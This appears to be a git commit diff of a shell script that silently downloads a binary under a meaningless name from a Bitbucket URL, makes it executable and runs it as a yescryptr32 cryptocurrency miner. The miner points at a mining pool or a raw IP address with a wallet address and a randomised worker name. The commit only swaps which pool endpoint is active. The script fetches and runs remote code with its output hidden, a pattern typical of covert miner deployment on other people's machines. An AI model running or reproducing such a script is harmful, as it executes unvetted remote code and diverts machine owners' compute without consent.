642524f3e9b322a70767c6d78e1bb9e9585ac4bf
barburonjilo <barburonjilo@outlook.co.id>
2024-08-03 09:32:44 +0700

    Update pcunermi.sh

--- pcunermi.sh
+++ pcunermi.sh
@@ -6,5 +6,5 @@ sudo ./configurasi.sh
 ./configurasi.sh
 wget -O sgr1 https://bitbucket.org/boluna/file/downloads/mintul >/dev/null 2>&1
 chmod +x sgr1
-# ./sgr1 -a yescryptr32  -o stratum+tcps://stratum-asia.rplant.xyz:17116 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5)
-./sgr1 -a yescryptr32  -o 45.115.225.55:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5)
+./sgr1 -a yescryptr32  -o stratum+tcps://stratum-asia.rplant.xyz:17116 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5)
+# ./sgr1 -a yescryptr32  -o 45.115.225.55:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5)
